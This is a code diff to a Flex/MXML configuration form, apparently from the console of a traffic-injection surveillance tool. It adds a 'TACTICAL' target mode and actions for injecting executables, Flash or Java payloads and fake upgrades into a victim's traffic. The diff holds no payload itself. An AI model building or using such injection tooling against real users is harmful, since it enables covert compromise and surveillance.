@@ -193,6 +193,31 @@
         _selectedTarget = event.selectedItem;
         agent.selectedItemId = null;
       }
+      
+      private function  onIdentChange():void
+      {
+        if(ident.selectedItem=="TACTICAL")
+        {
+          ident_param.text=""
+          ident_param.enabled=false;
+        }
+        else{
+          ident_param.enabled=true;
+        }
+      }
+      
+      private function  onActionChange():void
+      {
+        currentState="normal";
+        if(action.selectedItem=="INJECT-HTML-FLASH" || action.selectedItem=="INJECT-UPGRADE")
+        {
+          resource.text=""
+          resource.enabled=false;
+        }
+        else{
+          resource.enabled=true;
+        }
+      }
     ]]>
   </fx:Script>
   
@@ -223,7 +248,7 @@
     </s:FormItem>
     
     <s:FormItem label="{R.get('IDENT')}">
-      <s:DropDownList id="ident" width="200" requireSelection="true">
+      <s:DropDownList id="ident" width="200" requireSelection="true" change="onIdentChange()">
         <s:dataProvider>
           <s:ArrayCollection>
             <fx:String>STATIC-IP</fx:String>
@@ -236,6 +261,7 @@
             <fx:String>RADIUS-TECHKEY</fx:String>
             <fx:String>STRING-CLIENT</fx:String>
             <fx:String>STRING-SERVER</fx:String>
+            <fx:String>TACTICAL</fx:String>
           </s:ArrayCollection>
         </s:dataProvider>
       </s:DropDownList>
@@ -250,12 +276,13 @@
     </s:FormItem>
     
     <s:FormItem label="{R.get('ACTION')}">
-      <s:DropDownList id="action" width="200" change="{currentState = 'normal'}"
+      <s:DropDownList id="action" width="200" change="onActionChange()"
                       requireSelection="true">
          <s:dataProvider>
            <s:ArrayCollection>
              <fx:String>INJECT-EXE</fx:String>
-             <fx:String>INJECT-HTML</fx:String>
+             <fx:String>INJECT-HTML-FLASH</fx:String>
+             <fx:String>INJECT-HTML-JAVA</fx:String>
              <fx:String>INJECT-UPGRADE</fx:String>
              <fx:String>REPLACE</fx:String>
            </s:ArrayCollection>
